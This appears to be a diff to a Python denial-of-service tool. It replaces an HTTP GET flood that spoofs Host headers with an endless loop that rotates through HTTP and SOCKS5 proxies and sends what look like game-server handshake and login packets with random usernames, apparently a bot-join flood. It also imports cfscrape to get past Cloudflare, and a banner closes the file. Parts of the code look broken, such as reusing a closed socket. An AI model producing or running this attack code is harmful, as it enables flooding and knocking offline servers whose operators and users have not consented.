@@ -5,6 +5,8 @@ import requests
 import socket
 import os
 import cfscrape
+import socks
+import string
 
 s = cfscrape.create_scraper()
 
@@ -64,12 +66,22 @@ def dosweb2(target):
 
 def ddosip():
     while True:
-        fake_ip = random.choice(fakeip_list)
-        r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        r.connect((ip, port))
-        r.sendto(("GET /" + ip + " HTTP/1.1\r\n").encode('ascii'), (ip, port))
-        r.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (ip, port))
-        r.close()
+        usr = random.choice(string.ascii_uppercase) + str(random.randint(00000000, 99999999)) + random.choice(string.ascii_uppercase)
+        m1 = random.choice(proxy_http).split(':')
+        m2 = random.choice(proxy_socks).split(':')
+        sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
+
+        sock.setproxy(socks.PROXY_TYPE_SOCKS5, m1[0], int(m1[1]))
+        sock.connect((ip, port))
+        sock.send('\x06\x00%s\x00\x00\x00\x02' % chr(47))
+        sock.send('\x0c\x00\n' + usr)
+        sock.close()
+
+        sock.setproxy(socks.PROXY_TYPE_SOCKS5, m2[0], int(m2[1]))
+        sock.connect((ip, port))
+        sock.send('\x06\x00%s\x00\x00\x00\x02' % chr(47))
+        sock.send('\x0c\x00\n' + usr)
+        sock.close()
 
 
 print("\\-\          //-/    //-/\\-\       ==========     ||====\-\   //=====\-\ ||======-\     ")
